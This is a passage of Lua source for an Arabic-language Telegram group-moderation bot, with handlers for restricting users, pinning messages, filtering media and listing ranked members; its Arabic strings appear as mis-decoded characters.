tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^ΨͺΩΩΩΨ― ΩΩΩ (%d+)$') or text:match('^ΩΨͺΩ ΩΩΩ (%d+)$') or text:match('^ΨͺΩΩΨ― ΩΩΩ (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^ΨͺΩΩΩΨ― ΩΩΩ (%d+)$') or text:match('^ΩΨͺΩ ΩΩΩ (%d+)$') or text:match('^ΨͺΩΩΨ― ΩΩΩ (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΩΨ’ ΨͺΨ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨͺΩΩΨ― β * '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ ΨͺΩΩΨ―ΩΩ π« ΩΩΨ―Ψ© β * "..mutept.." Ω") 
Devmfm:sadd(mustafa..'mfm:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source Escobar     --
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
Devmfm:set('mustafaTEAM:'..mustafa..'id:user'..msg.chat_id_,TXT)  
Devmfm:setex('mustafaTEAM:'..mustafa.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΨ§Ω * \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨΊΨ§Ψ‘ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ", 1, "md")
Dev_mfm(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md') 
end 
end 
if text and text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω (%d+)$")
function Reply(extra, result, success)
Devmfm:del(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
Devmfm:incrby(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ©* "..Num..' Ψ±Ψ³Ψ§ΩΩ', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$")
Devmfm:set('mustafaTEAM:'..mustafa..'ids:user'..msg.chat_id_,TXT)  
Devmfm:setex('mustafaTEAM:'..mustafa.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΨΉΨ―Ψ― Ψ§ΩΩΩΨ§Ψ· Ψ§ΩΨ§Ω * \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ§ΩΨΊΨ§Ψ‘ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ", 1, "md")
Dev_mfm(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΩΩΩΨ΄Ψ¦ΩΩ ΩΩΨ·', 1, 'md') 
end 
end 
if text and text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^Ψ§ΨΆΩ ΩΩΨ§Ψ· (%d+)$")
function Reply(extra, result, success)
Devmfm:incrby(mustafa..'mfm:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ Ψ§ΨΆΨ§ΩΨ©* "..Num..' ΩΩΨ·Ω', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if Devmfm:get(mustafa..'mfm:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then Devmfm:sadd(mustafa.."mfm:cleaner"..msg.chat_id_, msg.id_) else Devmfm:sadd(mustafa.."mfm:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^ΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) then 
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, "β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ ΩΨ§ΨΉΨ§Ψ―Ψ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩΩΩΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
Devmfm:set(mustafa..'mfm:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n *β β« ΨͺΩΩΩΩ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΩΩΨ’ !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source Escobar     --
if Admin(msg) then
if text == "Ψ§ΩΩΩΩΨ²ΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:VipMem:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Escobar     --
if Manager(msg) then
if text == "Ψ§ΩΨ§Ψ―ΩΩΩΩ" and ChCheck(msg) or text == "Ψ§ΩΨ§Ψ―ΩΩΩΨ©" and ChCheck(msg) then 
local mfm =  'mfm:Admins:'..msg.chat_id_
local List = Devmfm:smembers(mustafa..mfm)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source Escobar     --
if Constructor(msg) then
if text == "Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘" and ChCheck(msg) or text == "ΩΨ―Ψ±Ψ§Ψ‘" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Managers:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "Ψ§ΩΩΩΨΈΩΩΩΩ°Ω" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Cleaner:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΨΈΩΩΩΩ°Ω β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨΈΩΩΩΩ°Ω*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Escobar     --
if BasicConstructor(msg) then
if text == "Ψ§ΩΩΩΨ΄Ψ¦ΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Constructor:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source Escobar     --
if mfmConstructor(msg) then
if text == "Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ" and ChCheck(msg) or text == "ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ" and ChCheck(msg) or text == "Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:BasicConstructor:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω Ψ’ΩΨ’Ψ³Ψ’Ψ³ΩΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("Ψ§ΩΩΩΨ΄Ψ¦") and ChCheck(msg) or text ==("Ψ§ΩΩΨ§ΩΩ") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ", 1, "md")
return false  
end
local UserName = (dp.username_ or "TEAM_Escobar")
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β * ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source Escobar     --
if Admin(msg) then
if text == "Ψ§ΩΩΩΨͺΩΩΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Muted:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪͺΨͺΩΩΩΩΩ°Ω β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨͺΩΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if text == "Ψ§ΩΩΩΩΨ―ΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Tkeed:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΩΩΨ―ΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ―ΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if text == "Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ" and ChCheck(msg) or text == "Ψ§ΩΩΨ­ΨΆΩΨ±ΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:Ban:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ" and ChCheck(msg) then
local List = Devmfm:hkeys(mustafa..'mfm:Filters:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΨΉ β β₯‘ * \nββββ EB ββββ\n"
for k, v in pairs(List) do
text = text..k..'~ β¨ '..v..' β©\n'
end
if #List == 0 then
text = "*β β« ΩΨ’ ΨͺΩΨ¬ΩΪ ΪͺΩΩΩΨ’Ψͺ ΩΩΩΩΩΩΜΫΨΉΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source Escobar     --
if text == "Ψ§ΩΩΨ·Ψ§ΩΩ" and ChCheck(msg) or text == "Ψ§ΩΩΨ·Ψ§ΩΨ©" and ChCheck(msg) then
local List = Devmfm:smembers(mustafa..'User:Donky:'..msg.chat_id_)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ ΩΨ·Ψ§ΩΨ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© πΉπ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "β β« *ΩΨ’ ΨͺΩΨ¬ΩΪ ΩΨ·Ψ§ΩΩ ΪͺΩΩΨ’ Ψ’ΩΨ’ΪΩ* πΉπ"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Escobar     --
if text == "Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ" and SecondSudo(msg) or text == "Ψ§ΩΨ«Ψ§ΩΩΩΩΩ" and SecondSudo(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:SecondSudo:')
text = "β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ β β₯‘ \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "β β« *ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΩ ΩΨͺΩ Ψ±ΩΨΉ Ψ§Ω ΩΨ·ΩΨ±ΩΩ Ψ«Ψ§ΩΩΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if SudoBot(msg) then
if text == "ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω" and ChCheck(msg) or text == "Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω" and ChCheck(msg) or text == "Ψ§ΩΩΩΨͺΩΩΩΩ ΨΉΨ§Ω" and ChCheck(msg) or text == "β ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω β" and ChCheck(msg) then 
local BanAll = Devmfm:smembers(mustafa..'mfm:BanAll:')
local MuteAll = Devmfm:smembers(mustafa..'mfm:MuteAll:')
if #BanAll ~= 0 then 
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ­ΩΨΈΩΩΰ’ͺΩΩ°Ω ΨΉΩΨ’Ω  β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(BanAll) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪͺΨͺΩΩΩΩΩ°Ω ΨΉΩΨ’Ω β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(MuteAll) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "β β« *ΩΩ ΩΨͺΩ Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨΉΨΆΩΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if text == "Ψ§ΩΩΨ·ΩΨ±ΩΩ" and ChCheck(msg) or text == "β Ψ§ΩΩΨ·ΩΨ±ΩΩ β" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:SudoBot:')
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local sudouser = Devmfm:get(mustafa..'mfm:Sudos'..v) 
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."] β¬ Gps : "..(sudouser or 0).."\n"
else
text = text..""..k.."~ : `"..v.."` β¬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "β β« *ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΩ ΩΨͺΩ Ψ±ΩΨΉ Ψ§Ω ΩΨ·ΩΨ±ΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if text == "Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:ManagerAll:')
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ Ψ’ΩΨΉΩΨ’ΩΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘ ΨΉΨ§ΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source Escobar     --
if text == "Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω" and ChCheck(msg) or text == "Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§ΩΩΩ" and ChCheck(msg) then 
local List = Devmfm:smembers(mustafa..'mfm:VipAll:')
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΩΩΩΩΩ°Ψ²ΩΩ Ψ’ΩΨΉΩΨ’Ω β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ ΨΉΨ§Ω*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source Escobar     --
if text == "Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ" and ChCheck(msg) then 
local mfm =  'mfm:AdminAll:'
local List = Devmfm:smembers(mustafa..mfm)
text = "*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ Ψ’ΩΨ’ΪΩΩΩΩΩΫ Ψ’ΩΨΉΩΨ’ΩΩΩ β β₯‘ * \nββββ EB ββββ\n"
for k,v in pairs(List) do
local username = Devmfm:get(mustafa..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "β β« *ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ ΨΉΨ§ΩΩΩ*"
end
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source Escobar     --
if text ==("Ψ±ΩΨΉ Ψ§ΩΩΩΨ΄Ψ¦") and ChCheck(msg) or text ==("Ψ±ΩΨΉ Ψ§ΩΩΨ§ΩΩ") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
Devmfm:del(mustafa..'mfm:mfmConstructor:'..msg.chat_id_)
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ", 1, "md")
return false  
end
local UserName = (dp.username_ or "TEAM_Escobar")
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
Devmfm:sadd(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source Escobar     --
if Manager(msg) then
if text == 'ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
Devmfm:sadd(mustafa.."mfm:FilterSteckr"..msg.chat_id_,idsticker)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅Ω Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩ ΩΨ¬Ψ―Ψ―Ψ§', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Devmfm:sadd(mustafa.."mfm:FilterPhoto"..msg.chat_id_,photo)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±Ω Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Devmfm:sadd(mustafa.."mfm:FilterAnimation"..msg.chat_id_,idanimation)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source Escobar     --
if text == 'Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
Devmfm:srem(mustafa.."mfm:FilterSteckr"..msg.chat_id_,idsticker)
